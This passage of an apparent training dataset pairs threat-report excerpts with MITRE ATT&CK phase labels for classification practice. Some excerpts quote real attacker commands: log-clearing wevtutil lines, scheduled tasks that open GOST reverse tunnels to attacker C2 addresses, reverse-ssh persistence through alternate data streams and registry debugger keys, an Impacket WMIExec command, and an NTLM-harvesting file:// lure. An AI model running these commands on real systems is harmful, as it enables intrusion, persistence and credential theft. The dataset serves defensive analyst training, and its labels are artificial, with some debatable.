        "input": "Described attack activity: The inability of security teams to properly monitor all traffic crossing the backplane is a problem in today's OT networks. Proprietary protocols that were once obscured from view are now being brought to light and decoded with modern tooling. Since these protocols are often capable of making critical changes to the devices that they speak to, more focus is being put on them by malicious actors and legitimate operators alike. Without the ability to see everything going on on the backplane networks, operators are leaving their monitoring tools like Snort3 blind to potential attacks. \nSecurity vendors can't solve this problem on their own. While groups like Cisco are capable of building the hardware to perform this type of monitoring, the impact to customer warranties introduced by plugging in a third-party module cannot be ignored. For monitoring of this type to truly become an option, consumer demand must drive the conversation. PLC vendors have both the capability and the product expertise to create products that accomplish what Badgerboard set out to do; they just need to be pushed by their customers. ",
        "output": "impact",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: An attempt to open lsass.exe process was observed on the system where lateral movement occurred but there were no signs of successful read attempts.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time. Examples included:\nWhile running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP's and seen right after this mistake.\nCmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe. The example below using the time command:\nRed Canary provides a good detection guide for RunDLL32;thiscovers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.\nDiscovery command invocation:\nAdFindwas observed via a file write for the binary, but there was no evidence of execution.\nFile share enumeration was achieved using the PowerShellInvoke-ShareFinderscript, part of PowerView.\nThe output file was created at c:\\ProgramData\\found_shares.txt. The use of this tool has been observed in otherrecent intrusions. PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe\nOn the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.\nAfter reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In one of the runs we've observed, the attacker sent emails with an HTML file attachment to multiple recipients in different organizations. The email message informed the target recipients that they had a voice message. \nFrom cookie theft to BEC: Attackers use AiTM phishing sites as entry point to further financial fraud | Microsoft Security Blog \nWhen a recipient opened the attached HTML file, it was loaded in the user's browser and displayed a page informing the user that the voice message was being downloaded. Note, however, that the download progress bar was hardcoded in the HTML file, so no MP3 file was being fetched. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Rebuilding relocations is a critical step in restoring a deobfuscated binary to an executable state. This process involves adjusting memory references within the code so that all references point to the correct locations after the code has been moved or modified. On the x86-64 architecture, this primarily concerns instructions that use RIP-relative addressing, a mode where memory references are relative to the instruction pointer. \nRelocation is necessary when the layout of a binary changes, such as when code is inserted, removed, or shifted during deobfuscation. Given our deobfuscation approach extracts the original instructions from the obfuscator, we are required to relocate each recovered instruction appropriately into a new code segment. This ensures that the deobfuscated state preserves the validity of all memory references and that the accuracy of the original control and data flow is sustained. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor copied svshost.exe to C:\\naz\\naz and then executed it. This PE creates \"XMRig CPU mine.exe\" and HideAll.bat in C:\\Windows\\PolicyDefinitions and then executes both of them.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique: Indicator Removal on Host: Clear Windows Event Logs (T1070.001) ATT&CK Technique: Modify Registry (T1112) ATT&CK Technique: Impair Defenses or Modify Tools (T1562.001) \nThroughout the attack, the adversary made multiple attempts to evade detection and subvert security controls in place as described throughout previous sections of this blog post. We also observed the attacker attempting to clear the contents of security logs on compromised systems. The following command-line syntax was observed being used to clear the System, Security and Application Windows Event Logs. \nc:\\windows\\system32\\wevtutil.exe cl system c:\\windows\\system32\\wevtutil.exe cl security ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA also observed the threat actor using open-source tools such as Plink and TightVNC for lateral movement. CISA observed the threat actor using the techniques identified in table 8 for lateral movement within the victim environment. \nTable 8: Lateral movement techniques ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cobalt Strike PsExec\nCobalt Strike served as the primary tool utilized by the threat actor, with a particular focus on its capabilities that mimic Sysinternals PsExec. These features, including psexec and psexec_psh, enable remote process execution across systems. The psexec module functions by uploading a binary to the target system, then creating and launching a Windows service to execute the file.\nThe eventID 7045 in Windows System logs shows the services created on the system:\nThe psexec command spawned a rundll32.exe process.\nThe psexec_psh module doesn't copy a binary to the target, but instead executes a PowerShell one-liner. The pattern it uses is %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ...",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Evidence suggests that North Korean IT workers are using real-time deepfake technology to infiltrate organizations through remote work positions, which poses significant security, legal and compliance risks. The detection strategies we outline in this report provide security and HR teams with practical guidance to strengthen their hiring processes against this threat.\nIn our demonstration, it took just over an hour with no prior experience to figure out how to create a real-time deepfake using readily available tools and cheap consumer hardware. This allows adversaries to easily create convincing synthetic identities, enabling them to operate undetected and potentially generate revenue for sanctioned regimes.\nWhile we can still detect limitations in current deepfake technology, these limitations are rapidly diminishing. Organizations must implement layered defenses by combining enhanced verification procedures, technical controls and ongoing monitoring throughout the employee lifecycle.\nPalo Alto Networks customers are better protected from the threats discussed in this article throughUnit 42 Insider Threat Services.\nOrganizations can engage theUnit 42 Incident Response teamfor specific assistance with this threat and others.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Prior to launching the final stage of the attack, the threat actors gained administrative access to a deployed endpoint detection and response (EDR) solution to make modifications, removing libraries that affected the agents across the enterprise. In addition, a binary to disable components of Microsoft Defender Antivirus was propagated using custom tooling. The distributed binary named disable-defender.exe queries for TokenElevation using the GetTokenInformation API and checks if the process is running with elevated privileges. If the token is not running with elevated privilege, the binary prints \"Must run as admin $|!\\backslash\\mathfrak{n^{\\prime\\prime}}$ . If the token is elevated, it queries TokenUser and checks if the SID is $\"{\\sf S}-1-5-18\"$ . If the current process doesn't run under system context, it prints \"Restarting with privileges\\n\" and attempts to elevate the privilege. \nTo elevate the privilege, the binary checks if the TrustedInstaller service is enabled. To do this, it starts the service \"SeDebugPrivilege\" and \"SeImpersonatePrivilege\" to assign privileges to itself. It then looks for winlogon.exe process, acquires its token, and impersonates calling thread using ImpersonateLoggedOnUser/SetThreadToken. After impersonating as winlogon.exe, it opens TrustedInstaller process, acquires its token for impersonation and creates a new process with elevated privileges using CreateProcessWithTokenW. \nOnce it successfully creates its own process with TrustedInstaller privilege, it proceeds to disable Defender components. \nTerminates smartscreen.exe   \nModifies WinDefend service to DemandLoad.   \nModifies \"TamperProtection\" value to 0   \nQueries WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class for \"DisableRealtimeMonitoring\"   \nSets \"DisableAntiSpyware\" value to 1   \nSets \"SecurityHealth\" value to 3   \nSets \"DisableAntiSpyware\" value to 0   \nSets \"SYSTEM\\CurrentControlSet\\Services\\WinDefend\" service \"Start\" value to 3   \nSets \"DisableRealtimeMonitoring\" value to 1   \nModifies further settings using WMI \"Root\\Microsoft\\Windows\\Defender\" Namespace \"MSFT_MpPreference\" class values, \"EnableControlledFolderAccess\" \"PUAProtection\" \"DisableRealtimeMonitoring\" \"DisableBehaviorMonitoring\" \"DisableBlockAtFirstSeen\" \"DisablePrivacyMode\" \"SignatureDisableUpdateOnStartupWithoutEngine\" \"DisableArchiveScanning\" \"DisableIntrusionPreventionSystem\" \"DisableScriptScanning\" \"DisableAntiSpyware\" \"DisableAntiVirus\" \"SubmitSamplesConsent\" \"MAPSReporting\" \"HighThreatDefaultAction\" \"ModerateThreatDefaultAction\" \"LowThreatDefaultAction\" \"SevereThreatDefaultAction\" \"ScanScheduleDay\" \nAdditional evasion techniques included the deletion of tooling, Windows events, and application logs. ",
        "output": "defense evasion",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0270 has been seen using setup.bat commands to enable BitLocker encryption, which leads to the hosts becoming inoperable. For workstations, the group uses DiskCryptor, an open-source full disk encryption system for Windows that allows for the encryption of a device's entire hard drive. The group drops DiskCryptor from an RDP session and when it is launched, begins the encryption. This method does require a reboot to install and another reboot to lock out access to the workstation. \nThe following are DEV-0270's PowerShell commands using BitLocker: \nMicrosoft will continue to monitor DEV-0270 and PHOSPHORUS activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. ",
        "output": "impact",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors were evicted from the network before any further impact occurred.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Despite encouraging reports of waning threat activity, WannaCry continues to pose significant risks. Given this malware's effective repropagation mechanisms, virtually any organization that hasn't applied Microsoft's recommended mitigation mechanisms is at potential risk of attempted WannaCry propagation. Furthermore, the emergence of new variants demonstrates the operators could remove WannaCry's killswitch functionality if desired, or significantly modify it to avoid countermeasures taken thus far. Public reports demonstrate that incidents associated with the WannaCry ransomware family have occurred in many countries. ",
        "output": "impact",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: NV.html, tracked by Microsoft as EnvyScout, can be best described as a malicious dropper capable of de-obfuscating and writing a malicious ISO file to disk. EnvyScout is chiefly delivered to targets of NOBELIUM by way of an attachment to spear-phishing emails. \nThe HTML <body> section of NV.html contains four notable components: \nComponent #1: Tracking and credential-harvesting URLs \n<body> (center)   \n9 (img src = file://54.38.137.218/img_lk.png>   \n16 <img src = http://enpport.com/img_tst.jpg> (div) \nIn one variant of EnvyScout, the $<$ <body> section contains two URLs, as shown above. \nThe first, prefixed with a file:// protocol handler, is indicative of an attempt to coax the operating system to send sensitive NTLMv2 material to the specified actorcontrolled IP address over port 445. It is likely that the attacker is running a credential capturing service, such as Responder, at the other end of these transactions. Later, brute-forcing of these credentials may result in their exposure. \nThe second URL, which resolves to the same IP address as the former at the time of analysis, remotely sources an image that is part of the HTML lure. This technique, sometimes referred to as a \"web bug\", serves as a read receipt of sorts to NOBELIUM, validating that the prospective target followed through with opening the malicious attachment. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Within the victim's environment, we found many MEGAcmd tools dropped onto infected machines. MEGAcmd is a command-line tool used for interacting with the MEGA cloud storage service.  We infer that the threat actors attempted to use this tool for exfiltrating stolen data to MEGA, hoping to capitalize on its ability to efficiently upload large volumes of data. This procedure was also observed with an associated group,Earth Lusca.",
        "output": "exfiltration",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the threat actors gained access to the EC2 instances, they successfully compromised long-term AWS access keys that existed on the host. Regardless of whether the computer exists on-premises or in the cloud, if a person uses the AWS command-line interface (CLI), they can choose to store temporary or permanent credentials used for the authentication within a credentials file stored on the host (as shown in Figure 1 below, which includes the file path).\nIn the cases we observed, these plain-text credentials existed on the compromised hosts, which allowed the threat actors to steal them and start using the access keys for discovery activity.",
        "output": "credential access",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For the fourth consecutive time in over a year, the most observed means of gaining initial access was the use of valid accounts, accounting for 66 percent of engagements when initial access could be determined. This is a slight increase compared to the previous quarter (60 percent). Additionally, 20 percent of engagements featured adversaries exploiting or leveraging vulnerable and public-facing applications for initial access. \nValid accounts was the top infection vector when identified in Q3 \nLooking forward: Talos IR identified a sophisticated actor targeting a critical infrastructure entity leveraging several known vulnerabilities in internet-facing web servers and two F5 BIG-IP network appliances, consistent with Talos' reporting on state-sponsored and other sophisticated adversaries' increased interest in targeting network devices. We assess that networking equipment will remain an attractive target due to the large attack surface it presents and potential access to victim networks it can offer, highlighting the dichotomy of high value and weak security in these devices that makes them a prime target for exploitation. This activity is another reminder of the importance of patching systems, especially network-facing devices. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1006 Direct Volume Access   \nT1027 Obfuscated Files or Information T1027.001 Binary Padding T1027.002 Software Packing T1027.004 Compile After Delivery T1027.008 Stripped Payloads T1027.009 Embedded Payloads T1027.010 Command Obfuscation   \nT1036 Masquerading T1036.001 Invalid Code Signature T1036.005 Match Legitimate Name or Location   \nT1055 Process Injection   \nT1070 Indicator Removal T1070.001 Clear Windows Event Logs T1070.004 File Deletion T1070.005 Network Share Connection Removal   \nCloud Blog Contact sales History and Configurations T1070.008 Clear Mailbox Data T1070.009 Clear Persistence   \nT1078 Valid Accounts T1078.002 Domain Accounts T1078.003 Local Accounts T1078.004 Cloud Accounts   \nT1112 Modify Registry   \nT1127 Trusted Developer Utilities Proxy Execution T1127.001 MSBuild   \nT1134 Access Token Manipulation T1134.001 Token Impersonation/Theft   \nT1140 Deobfuscate/Decode Files or Information   \nT1202 Indirect Command Execution   \nT1207 Rogue Domain Controller   \nT1218 System Binary Proxy Execution T1218.001 Compiled HTML File T1218.005 Mshta T1218.007 Msiexec T1218.010 Regsvr32 T1218.011 Rundll32 T1218.014 MMC   \nT1222.001 Windows File and Directory Permissions Modification   \nT1222.002 Linux and Mac File and Directory Permissions Modification   \nT1484 Domain Policy Modification T1484.001 Group Policy Modification   \nT1548 Abuse Elevation Control Mechanism T1548.002 Bypass User Account Control   \nT1550 Use Alternate Authentication Material T1550.002 Pass the Hash   \nT1553 Subvert Trust Controls T1553.002 Code Signing T1553.005 Mark-of-the-Web Bypass   \nT1556 Modify Authentication Process T1556.002 Password Filter DLL T1556.003 Pluggable Authentication Modules T1556.006 Multi-Factor Authentication   \nT1562 Impair Defenses T1562.001 Disable or Modify Tools \nT1562.002 Disable Windows Event Logging T1562.004 Disable or Modify System Firewall \nT1564.001 Hidden Files and Directories T1564.003 Hidden Window T1564.010 Process Argument Spoofing \nT1574 Hijack Execution Flow T1574.011 Services Registry Permissions Weakness ",
        "output": "defense evasion",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named \"fodhelper_reg_hashes.bat\".\nContents of fodhelper_reg_hashes.bat are as follows:\nThey also performed enumeration of the web browser information usingmore.\nThe following files were accessed:\nUsing a well known technique documented on theVeeam backup forum,the threat actor managed to decrypt passwords used by Veeam. The encryption method used by Veeam isData Protection API/DPAPI.\nAll the activity was done using RDP on the server with backups.\nDump the credentials using sqlcmd.exe to base64 passwords.\nVia RDP and notepad, they created a new file containing the code for the decryption routine.\nContent ofveeam1.cs.txt\nExecute, which gave the threat actors passwords that were used by Veeam.\nWe also observed the threat actor usingRubeustokerberoastandasreproastthe environment.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IPs:\n13[.]90.77.93 \n31[.]132.2.66\nUser Agents:\nBoto3/1.26.45 Python/3.9.2 Linux/6.0.0-2parrot1-amd64 Botocore/1.29.45 \nBoto3/1.7.61 Python/3.5.0 Windows/ Botocore/1.10.62 \naws-cli/1.19.1 Python/3.9.2 Linux/6.0.0-2parrot1-amd64 botocore/1.29.58 \naws-cli/1.18.69 Python/3.5.2 Linux/4.4.0-1128-aws botocore/1.16.19 \nScout Suite/5.12.0 Python/3.9.2 Linux/6.0.0-2parrot1-amd64 Scout Suite/5.12.0\nUpdated August 16, 2023, at 1:45 p.m. PT to add Cortex protections information.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.\nThe executable was named \"cool.exe\" :\nThree milliseconds after theZerologonexploit, an event 4742 \"A computer account was changed.\" was generated on the targeted Domain Controller.\nAs explained in a detailed blog fromCrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV :\nAs we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller :\nAfter the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully.\nAfter being successfully authenticated, the DC password was set:\nThe PasswordLastSet field is equal to the TimeCreated field, meaning that the password of the domain controller was successfully updated.We can also see that the SubjectUserName is ANONYMOUS LOGON.\nA connection was performed from thebeachheadto the Domain Controller using the DC account.After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.\nThe explorer shell was also restarted by the threat actor:",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In thefirst partof our Water Labbu blog series, we described how the threat actor used the fraudulent websites of other cryptocurrency scammers to steal cryptocurrency. In our second entry in the Water Labbu series, we would like share how the threat actor leveraged a customer support application to compromise scammers and patched the application using malicious code.\nDuring our investigation, we managed to find a staged Cobalt Strike loader on Virus Total (SHA-256:b81edcbf1a0b56d0f401dcfe4a6ae4d293663b42f120e60579353b6aa86bb105) associated with this threat campaign. According to the sandbox behavior report on Virus Total, the loader launched a Cobalt Strike instance that was instructed to report on the infection progress. The collected information was sent to the server, \"linkstometa[.]com,\" which, as mentioned in our first blog entry, was for collecting balance information and delivering cryptocurrency hijacking scripts.",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exploitation for Privilege Escalation\nZer0dump:Zer0dump is a Proof-of-Concept (PoC) exploit for Zerologon vulnerability (CVE-2020-1472). The tool allows the compromise of unpatched Domain Controllers to obtain Domain Admins privileges in Active Directory environments.\nThe Zerologon exploitation is made by the following steps:\nLeverages a cryptographic weakness in Netlogon's AES-CFB8 implementation, which allows a threat actor to bypass authentication by sending Netlogon messages with a ClientCredential field filled with zeros. \nResets the Domain Controller's machine account password to an empty string, effectively granting administrative access to the domain. \nIntegrates with Impacket's secretsdump.py to extract credentials from the compromised Domain Controller. \nAfter exploitation, zer0dump attempts to restore the original machine account password.\nPachine & noPac:Pachine and noPac are offensive tools developed to exploit CVE-2021-42278 and CVE-2021-42287 vulnerabilities, allowing privilege escalation in Active Directory. They leverage the Kerberos Privilege Attribute Certificate (PAC) to potentially impersonate a domain administrator starting from a standard domain account.\nThe Pachine's scan options enumerate the domain controller to determine if it is vulnerable to CVE-2021-42278.\nTo exploit the previously mentioned vulnerabilities, noPac requires valid domain account credentials which are abused to obtain a Kerberos ticket that can be leveraged to compromise a domain admin.\nThe following image shows the usage of noPac to impersonate the domain administrator administrator.\nThe main difference between the two tools is that:\nPachine adds machine accounts and obtains TGS for specific SPNs. \nNoPac also provides the capability to drop shells and dump hashes.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in plaintext (as shown in Table 1 below) [T1552.001]. \nAppendix B: Indicators of Compromise lists threat actor IP addresses associated with the activity detailed in this section. \nNote: These events are independent and not correlated as a single timeline of compromise. \nIn addition, incident analysis identified the general observations listed below on victim infrastructure. Each event should be considered independent and may have been used by Unit 29155 cyber actors against multiple victims at different dates and timeframes. Appendix B: Indicators of Compromise lists IOCs associated with the observations in Table 1 and below. \n\uf0a7 In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors exfiltrated data to mega[.]nz using Rclone [T1567.002].   \n\uf0a7 Unit 29155 cyber actors used a Pass-the-Hash [T1550.002] via ProxyChains. Cyber actors performed SSH and SSHPass executions. \nCyber actors initiated a web request and executed commands via ProxyChains. This included obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows Management Instrumentation (WMI) with hashes, and making web requests with resources i.php and tunnel.jsp. In one instance, cyber actors used smbclient via ProxyChains to access internal network shares, and subsequently PSQL and MySQL clients to access internal databases. \nCyber actors used Impacket for post-exploitation and lateral movement. The script secretsdump.py was used from the Impacket framework to obtain domain credentials, while psexec.py was subsequently used to move laterally within a victim network. \nCyber actors used ntlmrelayx.py via Impacket and krbrelayx.py, which requires Impacket to function. \nCyber actors used Responder.py. \nCyber actors used su-bruteforce to brute force a selected user using the su command. \nCyber actors used BloodHound, an open source AD reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment. \nCyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP addresses. This open source post-exploitation tool automates assessing the security of large AD networks. \nCyber actors used LinPEAS, an open source script designed to automate the process of searching for potential privilege escalation vulnerabilities on a Linux victim. \nCyber actors used GO Simple Tunnel (GOST) (MD5: 896e0f54fc67d72d94b40d7885f10c51) for 30 days within one incident and against additional victims on various occasions. GOST is a tunneling tool designed to establish secure connections between clients and servers, allowing for secure data transmission over untrusted networks. \nCyber actors used Through the Wire against a victim's internet-facing Confluence server. Through the Wire is a proof of concept[14] exploit for CVE-2022-26134, an OGNL injection vulnerability allowing an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance. All versions of Confluence Server and Data Center prior to the fixed versions listed by Atlassian are affected by this vulnerability.[15] A reverse shell over HTTPS was used to communicate over listening host on port 8081. \nCyber actors initiated Nmap scans on localized web servers. \nCyber actors performed lateral movement from compromised web servers to exploit a corporate Microsoft Windows network, commonly using psexec.py from the Impacket framework. The script secretsdump.py from the Impacket framework was used to obtain domain credentials. \nCyber actors may have used Raspberry Robin malware in the role of an access broker [T1588.001]. \nCyber actors targeted victims' Microsoft Outlook Web Access (OWA) infrastructure with password spraying to obtain valid usernames and passwords [T1110.003]. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Beyond the access provided by the first exploitation vector, the attackers made sure they had additional remote access to several internal systems. \nDuring the BlackCat attack, the actors used a tool called reverse-ssh, compiled with the C2 server address embedded, to set up reverse SSH tunnels and provide reverse shells to the attacker. Reverse-ssh was deployed to C:\\ directory and named: system, Windows or cache task. \nIt was also observed hidden by writing to an alternate data stream (ADS) of the C:\\ directory using the following command: \nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -command  & {(get-content c:\\system -raw | set-content c:\\ -stream 'cachetask')} \nc:\\windows\\system32\\schtasks.exe /create /ru system /sc minute /tn microsoft\\windows\\wininet\\cachetask /tr c:\\:cachetask -b <bind port> /f c:\\windows\\system32\\schtasks.exe /run /tn microsoft\\windows\\wininet\\cachetask \nThe \"image file execution option\" debugger registry key was another way to ensure the malicious file would be persistently executed on the system: \nc:\\windows\\system32\\reg.exe add hklm\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\taskmgr.exe /v debugger /t reg_sz /d c:\\system \nDuring the BlackMatter attack, the group used a similar technique but with a different tool: GO Simple Tunnel (GOST). GOST is a Go-based tunneling tool that was used to establish a reverse SSH tunnel to an attacker-controlled C2 server. This C2 server is the same that was used in the BlackCat attack. The name used for the deployed Gost file was \"system.exe\", similar to the file name used in the BlackCat attack for reverse-ssh. \ncmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr c:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f cmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l rtcp://0.0.0.0:1116/127.0.0.1:3388 -f mwss://52[.]149[.]228[.]45:443 /st 12:00 /f cmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows wsus update /tr c:\\windows\\temp\\system.exe -l socks5://127.0.0.1:3388 /st 12:00 /f cmd.exe /q /c schtasks /create /ru system /sc hourly /tn windows defender /tr c:\\windows\\temp\\system.exe -l rtcp://0.0.0.0:1117/127.0.0.1:3388 -f mwss://20[.]46[.]245[.]56:443 /st 12:00 /f \nThe same C2 domain was used in both attacks: ",
        "output": "persistence",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware copies itself to removable drives that are plugged into an infected system. It creates the folder \"<drive_root>\\Kaspersky\\Usb Drive\\3.0\" on the removable drive and copies the encrypted files that contain the malicious components. An   \nexecutable is extracted from the file   \n\"aweu23jj46jm7dc\" and written to <drive_root>\\ <volume_name> .exe, which is responsible for   \nextracting and executing the content of  the   \nencrypted files. ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0270 has been seen creating defaultaccount and adding that account to the Remote Desktop Users group. The group uses the RDP connection to move laterally, copy tools to the target device, and perform encryption. \nAlong with RDP, Impacket's WMIExec is a known toolkit used by the group for lateral movement. In multiple compromises, this was the main method observed for them to pivot to additional devices in the organization, execute commands to find additional high-value targets, and dump credentials for escalating privileges. \nAn example of a command using Impacket's WMIExec from a remote device: \ncmd.exe /Q /c quser 1> \\\\127.0.0.1\\ADMIN\\$\\__1657130354.2207212 2>&1 ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
